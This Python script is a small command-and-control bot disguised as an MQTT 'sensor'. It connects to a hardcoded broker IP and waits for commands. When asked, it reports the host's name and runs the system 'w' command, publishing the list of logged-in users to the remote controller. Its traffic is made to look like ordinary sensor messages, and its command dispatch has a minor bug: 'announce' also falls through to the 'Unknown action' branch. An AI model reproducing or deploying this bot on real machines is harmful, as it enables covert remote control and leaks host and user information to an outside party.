import paho.mqtt.client as mqtt
import json
import time
import socket
import random
import subprocess

# Configuration
MQTT_BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SENSOR_ID = "sensor_" + str(random.randint(1, 1000))


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Sensor {SENSOR_ID} connected.")
        client.subscribe(TOPIC)
    else:
        print(f"Connection failed. Code: {rc}")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())

        # Message for me?
        target = payload.get("sensor_id")
        if target != SENSOR_ID and target != "all":
            return

        sender = payload.get("sender_id")
        action = payload.get("action")
        params = payload.get("params")
        print(f"Received {action} from {sender}")

        if action == "announce":
            announce(client, sender)
        if action == "w":
            logged_users(client, sender)
        else:
            print(f"Unknown action: {action}")

    except json.JSONDecodeError:
        print("Received non-JSON message")
    except Exception as e:
        print(f"Error processing message: {e}")


# --- Announce ---
def announce(client, sender):
    response = {
        "controller_id": sender,
        "sender_id": SENSOR_ID,
        "type": "presence",
        "status": "online",
        "hostname": socket.gethostname(),
        "timestamp": time.time()
    }

    message = json.dumps(response)
    client.publish(TOPIC, message)
    print(f"Announced message: {message}")


# --- Logged users ---
def logged_users(client, sender):
    try:
        result = subprocess.run(['w'], capture_output=True, text=True, check=True).stdout.strip()

        response = {
            "controller_id": sender,
            "sender_id": SENSOR_ID,
            "type": "connected_users",
            "payload": result,
            "timestamp": time.time()
        }

        message = json.dumps(response)
        client.publish(TOPIC, message)
        print(f"Connected users message: {message}")
    except Exception as e:
        return f"An unexpected error occurred: {e}"


def main():
    client = mqtt.Client(client_id=SENSOR_ID)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_BROKER, PORT, 60)
        client.loop_forever()
    except KeyboardInterrupt:
        print("Bot stopping...")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    main()
